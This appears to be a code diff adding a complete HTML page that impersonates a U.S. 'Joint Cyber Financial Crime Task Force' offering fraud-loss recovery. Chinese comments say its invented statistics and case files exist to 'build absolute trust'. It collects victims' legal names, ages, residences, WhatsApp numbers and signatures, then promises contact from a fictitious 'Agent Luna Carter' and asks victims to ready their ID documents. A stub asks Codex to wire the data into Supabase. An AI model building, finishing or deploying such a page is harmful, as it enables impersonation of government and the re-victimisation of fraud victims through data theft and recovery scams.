@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Joint Cyber Financial Crime Task Force - Task Force Intake & Recovery Network</title>
+    <style>
+        :root {
+            --gov-navy: #0B1D33;     
+            --gov-gold: #C5A059;     
+            --gov-blue: #1D4ED8;     
+            --text-dark: #1E293B;    
+            --bg-neutral: #F8FAFC;   
+            --border-heavy: #94A3B8;  
+            --alert-red: #B91C1C;    
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "Times New Roman", Georgia, -apple-system, sans-serif; 
+        }
+
+        body {
+            background-color: var(--bg-neutral);
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+
+        /* 顶层系统滚动通告 */
+        .system-ticker {
+            background-color: var(--alert-red);
+            color: #FFFFFF;
+            font-size: 11px;
+            font-weight: bold;
+            text-align: center;
+            padding: 8px 10px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            font-family: sans-serif;
+        }
+
+        /* 核心官方页眉 */
+        header {
+            background-color: var(--gov-navy);
+            color: #FFFFFF;
+            padding: 25px 20px;
+            text-align: center;
+            border-bottom: 4px solid var(--gov-gold);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        .header-logo-area {
+            margin-bottom: 10px;
+        }
+
+        .header-logo-area img {
+            width: 70px;
+            height: 70px;
+            object-fit: contain;
+        }
+
+        header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        header p {
+            font-size: 12px;
+            color: #94A3B8;
+            letter-spacing: 1.5px;
+            font-family: sans-serif;
+            margin-top: 5px;
+        }
+
+        /* 页面主体栅格 - 电脑端双栏，移动端单栏 */
+        .main-layout {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 25px;
+            max-width: 1100px;
+            margin: 30px auto;
+            padding: 0 15px;
+        }
+
+        @media (min-width: 850px) {
+            .main-layout {
+                grid-template-columns: 1.1fr 0.9fr; /* 左边案例与数据，右边主表单 */
+            }
+        }
+
+        /* 数据简报面板 */
+        .intel-dashboard {
+            background-color: #FFFFFF;
+            border: 1px solid #CBD5E1;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .intel-title {
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: var(--gov-navy);
+            border-bottom: 2px solid var(--gov-gold);
+            padding-bottom: 6px;
+            margin-bottom: 15px;
+            font-family: sans-serif;
+            letter-spacing: 0.5px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .stat-card {
+            background-color: #F1F5F9;
+            padding: 15px;
+            border-left: 4px solid var(--gov-navy);
+        }
+
+        .stat-card .num {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--alert-red);
+            font-family: monospace;
+        }
+
+        .stat-card .label {
+            font-size: 11px;
+            color: #475569;
+            text-transform: uppercase;
+            font-family: sans-serif;
+            margin-top: 3px;
+            font-weight: 600;
+        }
+
+        /* 维权破获案例板块 */
+        .case-section-title {
+            font-size: 20px;
+            font-weight: 800;
+            text-transform: uppercase;
+            color: var(--gov-navy);
+            margin-bottom: 15px;
+            letter-spacing: 0.5px;
+        }
+
+        .press-release-card {
+            background-color: #FFFFFF;
+            border: 1px solid #CBD5E1;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .meta-date {
+            font-size: 11px;
+            font-family: sans-serif;
+            color: #64748B;
+            font-weight: 700;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .case-headline {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--gov-navy);
+            line-height: 1.3;
+            margin-bottom: 10px;
+        }
+
+        .case-headline a {
+            color: var(--gov-blue);
+            text-decoration: none;
+        }
+
+        .case-body {
+            font-size: 13.5px;
+            color: #334155;
+            text-align: justify;
+        }
+
+        .case-img-placeholder {
+            width: 100%;
+            height: 150px;
+            background-color: #E2E8F0;
+            margin-top: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: #94A3B8;
+            font-family: sans-serif;
+            overflow: hidden;
+        }
+
+        .case-img-placeholder img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* 右侧核心表单区卡片 */
+        .dossier-container-box {
+            align-self: start;
+        }
+
+        .dossier-card {
+            background: #FFFFFF;
+            border: 1px solid #CBD5E1;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.08);
+            padding: 30px 24px;
+            position: relative;
+        }
+
+        /* 水印 */
+        .dossier-card::before {
+            content: "SECURE INTAKE";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-30deg);
+            font-size: 50px;
+            font-weight: 900;
+            color: rgba(241, 245, 249, 0.8);
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .dossier-form-wrapper {
+            position: relative;
+            z-index: 1;
+        }
+
+        .section-headline {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--gov-navy);
+            margin-bottom: 20px;
+            border-bottom: 2px solid var(--gov-navy);
+            padding-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        /* 进度控制指示 */
+        .progress-block {
+            margin-bottom: 25px;
+            font-family: sans-serif;
+        }
+
+        .progress-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--gov-blue);
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        .progress-line-bg {
+            background-color: #CBD5E1;
+            height: 5px;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress-line-fill {
+            background-color: var(--gov-navy);
+            height: 100%;
+            width: 33.3%;
+            transition: width 0.4s ease;
+        }
+
+        /* 表单内部组件 */
+        .field-row {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            font-family: sans-serif;
+            color: #0F172A;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+        }
+
+        input[type="text"], input[type="tel"], select, textarea {
+            width: 100%;
+            padding: 11px 12px;
+            border: 1px solid var(--border-heavy);
+            background-color: #FAFAFA;
+            font-size: 14px;
+            color: #0F172A;
+            outline: none;
+            border-radius: 2px;
+            font-family: sans-serif;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            background-color: #FFFFFF;
+            border-color: var(--gov-navy);
+        }
+
+        textarea {
+            height: 100px;
+            resize: none;
+        }
+
+        .statutory-warning-box {
+            background-color: #FEF2F2;
+            border: 1px solid #FEE2E2;
+            padding: 12px;
+            font-size: 11px;
+            color: var(--alert-red);
+            margin-top: 15px;
+            border-left: 3px solid var(--alert-red);
+            font-family: sans-serif;
+        }
+
+        .legal-checkbox-flex {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+
+        .legal-checkbox-flex input {
+            margin-top: 3px;
+        }
+
+        .legal-text {
+            font-size: 12px;
+            color: #334155;
+            font-style: italic;
+        }
+
+        /* 按钮控制 */
+        .action-flex {
+            margin-top: 25px;
+            display: flex;
+            gap: 15px;
+            font-family: sans-serif;
+        }
+
+        button {
+            padding: 14px;
+            border: none;
+            font-size: 13px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            border-radius: 2px;
+        }
+
+        .btn-forward {
+            flex: 2;
+            background-color: var(--gov-navy);
+            color: #FFFFFF;
+            border-bottom: 3px solid #000;
+        }
+
+        .btn-backward {
+            flex: 1;
+            background-color: #E2E8F0;
+            color: #475569;
+            border: 1px solid #CBD5E1;
+        }
+
+        .form-pane { display: none; }
+        .form-pane.active { display: block; }
+
+        /* 最终成功的最高指令卡（提交后全屏替换或本地渲染） */
+        .directive-panel {
+            text-align: center;
+            display: none;
+            background: #FFFFFF;
+            border: 1px solid #CBD5E1;
+            padding: 40px 25px;
+        }
+
+        .directive-title {
+            color: var(--gov-navy);
+            font-size: 22px;
+            font-weight: 800;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+        }
+
+        .case-token-plate {
+            background-color: #0B1D33;
+            color: var(--gov-gold);
+            padding: 12px;
+            font-family: monospace;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 1.5px;
+            margin: 20px 0;
+            border: 1px solid var(--gov-gold);
+        }
+
+        .operational-mandate {
+            text-align: left;
+            background-color: #F8FAFC;
+            border: 1px solid #CBD5E1;
+            padding: 20px;
+            font-size: 14px;
+            color: #1E293B;
+            border-top: 4px solid var(--gov-navy);
+            margin-bottom: 25px;
+        }
+
+        .operational-mandate p { margin-bottom: 12px; }
+
+        footer {
+            text-align: center;
+            font-size: 11px;
+            color: #475569;
+            padding: 30px 15px;
+            border-top: 1px solid #CBD5E1;
+            font-family: sans-serif;
+            background-color: #E2E8F0;
+            margin-top: 50px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="system-ticker">
+        CRITICAL MONITORING ACTIVE // OFFICIAL COMPLAINT CORRELATION RECOVERY STREAM // SESSION ID NO: 9942-A
+    </div>
+
+    <header>
+        <div class="header-logo-area">
+            <!-- 同级图片 1：放一个美国风警徽、鹰或者联合徽章，命名为 seal-emblem.png -->
+            <img src="seal-emblem.png" alt="Operational Authority Emblem" onerror="this.style.display='none'">
+        </div>
+        <h1>Joint Cyber Financial Crime Task Force</h1>
+        <p>NATIONAL INCIDENT INTAKE & COMPLIANCE ASSET RECOVERY MATRIX</p>
+    </header>
+
+    <!-- 主框架布局 -->
+    <div class="main-layout" id="pageGlobalLayout">
+        
+        <!-- 左侧：破案案例、动态战报统计（建立绝对信任） -->
+        <div class="left-intel-column">
+            
+            <!-- 实时拦截战报 -->
+            <div class="intel-dashboard">
+                <div class="intel-title">Active Asset Mitigation Statistics (2026 Q1-Q2)</div>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="num">$14,892,400</div>
+                        <div class="label">Total Disputed Capital Intercepted</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="num">3,412</div>
+                        <div class="label">Illicit Digital Wallets Frozen</div>
+                    </div>
+                </div>
+                <p style="font-size: 11px; color:#64748B; font-family:sans-serif; margin-top:10px; font-style:italic;">
+                    * Notice: Statistics are updated every standard business clearing ledger cycle.
+                </p>
+            </div>
+
+            <!-- 司法案例新闻稿 1 -->
+            <div class="case-section-title">Enforcement Directives & Success Files</div>
+            
+            <div class="press-release-card">
+                <div class="meta-date">Enforcement Docket #2026-CR-089</div>
+                <div class="case-headline">Joint Task Force Syncs Recovery of $1.2M USD From Transnational Marketplace Fraud Matrix</div>
+                <div class="case-body">
+                    Following a coordinated tactical cyber sweep, agents successfully isolated illicit settlement corridors routing capital out of domestic victim accounts. Through prompt multi-agency synchronization, 418 affected reporting individuals who logged formal profiles regarding deceptive platform transactions have had their original ledger values completely mapped and readied for distribution.
+                </div>
+                <!-- 同级图片 2：放一张高逼格的科技追资、或者是法庭/被捣毁诈骗团伙概念图，命名为 case-1.jpg -->
+                <div class="case-img-placeholder">
+                    <img src="case-1.jpg" alt="Asset Correlation Center" onerror="this.innerHTML='[Evidentiary System Interface Logged]'">
+                </div>
+            </div>
+
+            <!-- 司法案例新闻稿 2 -->
+            <div class="press-release-card">
+                <div class="meta-date">Enforcement Docket #2026-CR-114</div>
+                <div class="case-headline">Liquidation and Interception Order Executed Against Fraudulent Digital Liquidity Pools</div>
+                <div class="case-body">
+                    A specialized enforcement decree was deployed against artificial offshore financial applications that manipulated individual users via localized social media channels. By utilizing server-side hash verification, the task force successfully traced diverted capital, enabling eligible registrants who provide certified chronology details to bypass legacy institutional hold cycles.
+                </div>
+                <!-- 同级图片 3：类似上一张，命名为 case-2.jpg -->
+                <div class="case-img-placeholder">
+                    <img src="case-2.jpg" alt="Financial Tracking Mapping" onerror="this.innerHTML='[Secure Financial Node Map Registered]'">
+                </div>
+            </div>
+
+        </div>
+
+        <!-- 右侧：核心3步骤表单区 -->
+        <div class="dossier-container-box" id="formGlobalAnchor">
+            
+            <!-- 进度指示 -->
+            <div class="progress-block" id="flowProgressBlock">
+                <div class="progress-meta">
+                    <span id="paneIndicatorText">Dossier Stage 1 of 3</span>
+                    <span>System Verification</span>
+                </div>
+                <div class="progress-line-bg">
+                    <div class="progress-line-fill" id="flowProgressBar"></div>
+                </div>
+            </div>
+
+            <div class="dossier-card" id="mainDossierCard">
+                <div class="dossier-form-wrapper">
+                    <form id="dossierIntakeForm" onsubmit="return false;">
+                        
+                        <!-- PANE 1: 案件归类 -->
+                        <div class="form-pane active" id="pane1">
+                            <div class="section-headline">I. Incident Classification</div>
+                            
+                            <div class="field-row">
+                                <label for="incidentCategory">Operational Scenario Category *</label>
+                                <select id="incidentCategory" required>
+                                    <option value="">-- SELECT CLASSIFICATION --</option>
+                                    <option value="Digital Asset Dispute">Digital Asset Security Breach / Crypto Transfer Dispute</option>
+                                    <option value="Marketplace Settlement">Platform Marketplace Non-Settlement Incident</option>
+                                    <option value="Social Arbitrage Phishing">Social Engineering Communications / Phishing Interception</option>
+                                    <option value="Impersonation Fraud Matrix">Impersonation Matrix / Identity Hijacking</option>
+                                </select>
+                            </div>
+
+                            <div class="field-row">
+                                <label for="lossAuditing">Verified Financial Loss Valuation (USD) *</label>
+                                <select id="lossAuditing" required>
+                                    <option value="">-- SELECT TOTAL AUDITED LOSS --</option>
+                                    <option value="Below $5,000">Under $5,000 USD</option>
+                                    <option value="$5,000 - $20,000">$5,000 - $20,000 USD</option>
+                                    <option value="$20,000 - $50,000">$20,000 - $50,000 USD</option>
+                                    <option value="$5,0000+">$50,000+ USD (High Priority Stream)</option>
+                                </select>
+                            </div>
+
+                            <div class="field-row">
+                                <label for="hostPlatform">Primary Host Platform / Transmitting Channel *</label>
+                                <input type="text" id="hostPlatform" placeholder="e.g. Facebook Interface, Third-Party URL Link" required>
+                            </div>
+
+                            <div class="action-flex">
+                                <button type="button" class="btn-forward" onclick="navigatePane(2)">Initialize ID Routing</button>
+                            </div>
+                        </div>
+
+                        <!-- PANE 2: 人口特征与联系路径 -->
+                        <div class="form-pane" id="pane2">
+                            <div class="section-headline">II. Demographic & Comms Routing</div>
+
+                            <div class="field-row">
+                                <label for="legalName">Full Legal Name (As displayed on State ID) *</label>
+                                <input type="text" id="legalName" placeholder="First Name, Middle Initials, Last Name" required>
+                            </div>
+
+                            <div class="field-row">
+                                <div style="display: flex; gap: 15px;">
+                                    <div style="flex: 1;">
+                                        <label for="biologicalGender">Gender Profile *</label>
+                                        <select id="biologicalGender" required>
+                                            <option value="">-- SELECT --</option>
+                                            <option value="Male">Male</option>
+                                            <option value="Female">Female</option>
+                                            <option value="Withheld">Prefer Not to Disclose</option>
+                                        </select>
+                                    </div>
+                                    <div style="flex: 1;">
+                                        <label for="verifiedAge">Audited Age *</label>
+                                        <input type="text" id="verifiedAge" placeholder="Years" required pattern="[0-9]*">
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="field-row">
+                                <label for="primaryResidence">Current Primary Residence (State/Region) *</label>
+                                <input type="text" id="primaryResidence" placeholder="e.g. California, USA" required>
+                            </div>
+
+                            <div class="field-row">
+                                <label for="routingComms">Verified Communication Terminal Number (WhatsApp) *</label>
+                                <input type="tel" id="routingComms" placeholder="International format: +1 (XXX) XXX-XXXX" required>
+                                <span style="font-size: 11px; color: var(--gov-blue); font-family:sans-serif; margin-top:5px; display:block; font-weight:600;">
+                                    [MANDATORY] Case routing synchronization directives will deploy strictly to this node.
+                                </span>
+                            </div>
+
+                            <div class="action-flex">
+                                <button type="button" class="btn-backward" onclick="backtrackPane(1)">Return</button>
+                                <button type="button" class="btn-forward" onclick="navigatePane(3)">Review Legal Framework</button>
+                            </div>
+                        </div>
+
+                        <!-- PANE 3: 案情描述与法条警告 -->
+                        <div class="form-pane" id="pane3">
+                            <div class="section-headline">III. Event Chronology & Affirmation</div>
+
+                            <div class="field-row">
+                                <label for="incidentChronology">Comprehensive Event Chronology *</label>
+                                <textarea id="incidentChronology" placeholder="Detail the exact timeline sequence. Include communication vectors, dates of capital transfer, and claims made by the opposing entity..." required></textarea>
+                            </div>
+
+                            <div class="field-row">
+                                <label>Do you preserve verifiable evidentiary logs? (Transfer Ledger Scripts / Chat Logs) *</label>
+                                <div style="display: flex; gap: 25px; margin-top: 6px; font-family:sans-serif; font-size:13px;">
+                                    <label style="display:flex; align-items:center; gap:6px; font-weight:normal;">
+                                        <input type="radio" name="ledgerStatus" value="Preserved" checked> Yes, assets documented
+                                    </label>
+                                    <label style="display:flex; align-items:center; gap:6px; font-weight:normal;">
+                                        <input type="radio" name="ledgerStatus" value="Unpreserved"> No verifiable trail
+                                    </label>
+                                </div>
+                            </div>
+
+                            <div class="statutory-warning-box">
+                                <strong>FEDERAL STATUTORY DISCLOSURE NOTICE:</strong><br>
+                                Pursuant to <strong>18 U.S. Code § 1001</strong>, knowingly and willfully making false, fictitious, or fraudulent statements within an investigation ledger falls under statutory criminal penalties.
+                            </div>
+
+                            <label class="legal-checkbox-flex">
+                                <input type="checkbox" id="frameworkConsent" required>
+                                <span class="legal-text">
+                                    I formalize this intake request and declare under penalty of perjury that the details in this dossier are accurate.
+                                </span>
+                            </label>
+
+                            <div class="field-row" style="margin-top: 15px;">
+                                <label for="legalSignature">Authorized Digital Signature *</label>
+                                <input type="text" id="legalSignature" placeholder="Type Legal Full Name To Execute" required>
+                            </div>
+
+                            <div class="action-flex">
+                                <button type="button" class="btn-backward" onclick="backtrackPane(2)">Return</button>
+                                <button type="button" class="btn-forward" onclick="executeFinalIntake()">Submit Secure Dossier</button>
+                            </div>
+                        </div>
+
+                    </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- 极度震撼与命令式的感谢/指令页面（隐藏在最下方，提交后干掉双栏布局，全屏显示它） -->
+    <div class="container" id="successScreenWrapper" style="display: none; max-width: 650px; margin: 40px auto;">
+        <div class="directive-panel" id="directiveStateBlock" style="display: block;">
+            <div class="seal-wrapper" style="margin-bottom: 15px;">
+                <!-- 同级图片 4：放一个带全屏绿色打勾或官方烫金印章效果，命名为 success-seal.png -->
+                <img src="success-seal.png" alt="Operational Seal" style="width: 80px; height:80px; object-fit:contain;" onerror="this.style.display='none'">
+            </div>
+            <div class="directive-title">Dossier Execution Confirmed</div>
+            <p style="font-size: 13px; color: #475569; font-family:sans-serif; margin-top:-5px;">The Incident Verification Pipeline has successfully initialized.</p>
+            
+            <div class="case-token-plate" id="caseTokenDisplay">FILE ACCESS REQ: #US-2026-PENDING</div>
+            
+            <div class="operational-mandate">
+                <p><strong>MANDATORY OPERATIONAL DIRECTIVE FOR ALLOCATED FILE:</strong></p>
+                <p>Your logged incident dossier has bypassed standard baseline bureaucracy delays and has been dynamically assigned to <strong>Special Investigator Agent Luna Carter</strong> for urgent asset-tracking evaluation.</p>
+                <p>To establish secure identity parameters and synchronize blockchain transfer scripts, Agent Carter will initiate formal text-based communication with you directly via <strong>WhatsApp within the next 5 to 10 minutes</strong>.</p>
+                <p><strong>REQUIRED ACTION FROM REPORTING PARTY:</strong><br>
+                1. Locate your state-issued physical identification matrix (Driver's License / Passport).<br>
+                2. Consolidate all transactional screen vouchers, recipient account indices, and chat logs.<br>
+                3. Maintain active communication terminal logs. Do not disregard official verification updates.</p>
+            </div>
+            <p style="font-size: 11px; color: var(--alert-red); font-family:sans-serif; font-weight:bold;">SYSTEM WARNING: DO NOT RESUBMIT THIS DOSSIER. DUPLICATE DATA PACKETS DELAY CORRELATION.</p>
+        </div>
+    </div>
+
+    <footer>
+        U.S. GOVERNMENT ASSISTANCE NOTICE & REGULATORY DISCLAIMER:<br>
+        This tracking database network functions as a private financial data analytics router cooperating with regulatory task-force frameworks. Operational parameters are strictly synchronized under data encryption preservation protocol amendments. Records remain protected under the Statutory Privacy Code.
+    </footer>
+
+    <script>
+        function navigatePane(paneNum) {
+            const currentPane = document.querySelector('.form-pane.active');
+            const bounds = currentPane.querySelectorAll('input[required], select[required], textarea[required]');
+            let verified = true;
+            bounds.forEach(element => {
+                if(!element.checkValidity()) {
+                    element.reportValidity();
+                    verified = false;
+                }
+            });
+
+            if(!verified) return;
+
+            document.querySelectorAll('.form-pane').forEach(pane => pane.classList.remove('active'));
+            document.getElementById('pane' + paneNum).classList.add('active');
+
+            const progressBar = document.getElementById('flowProgressBar');
+            const paneIndicatorText = document.getElementById('paneIndicatorText');
+            
+            paneIndicatorText.innerText = `Dossier Stage ${paneNum} of 3`;
+            if(paneNum === 2) progressBar.style.width = '66.6%';
+            if(paneNum === 3) progressBar.style.width = '100%';
+        }
+
+        function backtrackPane(paneNum) {
+            document.querySelectorAll('.form-pane').forEach(pane => pane.classList.remove('active'));
+            document.getElementById('pane' + paneNum).classList.add('active');
+
+            const progressBar = document.getElementById('flowProgressBar');
+            const paneIndicatorText = document.getElementById('paneIndicatorText');
+            
+            paneIndicatorText.innerText = `Dossier Stage ${paneNum} of 3`;
+            if(paneNum === 1) progressBar.style.width = '33.3%';
+            if(paneNum === 2) progressBar.style.width = '66.6%';
+        }
+
+        function compileToken() {
+            const hexPool = '0123456789ABCDEF';
+            let segment = '';
+            for (let i = 0; i < 6; i++) {
+                segment += hexPool.charAt(Math.floor(Math.random() * hexPool.length));
+            }
+            return `FILE CONTROL NO: #US-2026-${segment}`;
+        }
+
+        async function executeFinalIntake() {
+            const form = document.getElementById('dossierIntakeForm');
+            const legalCheck = document.getElementById('frameworkConsent');
+            const signature = document.getElementById('legalSignature');
+            const narrative = document.getElementById('incidentChronology');
+
+            if(!narrative.checkValidity() || !legalCheck.checked || !signature.checkValidity()) {
+                form.reportValidity();
+                return;
+            }
+
+            const payload = {
+                incident_category: document.getElementById('incidentCategory').value,
+                audited_loss: document.getElementById('lossAuditing').value,
+                transmitting_channel: document.getElementById('hostPlatform').value,
+                legal_name: document.getElementById('legalName').value,
+                biological_gender: document.getElementById('biologicalGender').value,
+                verified_age: document.getElementById('verifiedAge').value,
+                primary_residence: document.getElementById('primaryResidence').value,
+                whatsapp_terminal: document.getElementById('routingComms').value,
+                event_chronology: document.getElementById('incidentChronology').value,
+                ledger_status: document.querySelector('input[name="ledgerStatus"]:checked').value,
+                digital_signature: signature.value,
+                timestamp_epoch: new Date().toISOString()
+            };
+
+            const responseStatus = await routeToDatabasePipeline(payload);
+
+            if(responseStatus) {
+                // 彻底隐藏双栏布局（案例和表单一起消失，避免干扰）
+                document.getElementById('pageGlobalLayout').style.display = 'none';
+                
+                // 唤醒全屏宽度的终审指令框
+                document.getElementById('caseTokenDisplay').innerText = compileToken();
+                document.getElementById('successScreenWrapper').style.display = 'block';
+                
+                window.scrollTo({top: 0, behavior: 'smooth'});
+            }
+        }
+
+        // ==========================================
+        //  CODEX SUPABASE INTEGRATION PIPELINE
+        // ==========================================
+        async function routeToDatabasePipeline(payload) {
+            console.log("Dossier localized compilation payload ready:", payload);
+            /* Codex 可以在这里无缝植入 Supabase 的 Insert 逻辑 */
+            return true; 
+        }
+    </script>
+</body>
+</html>
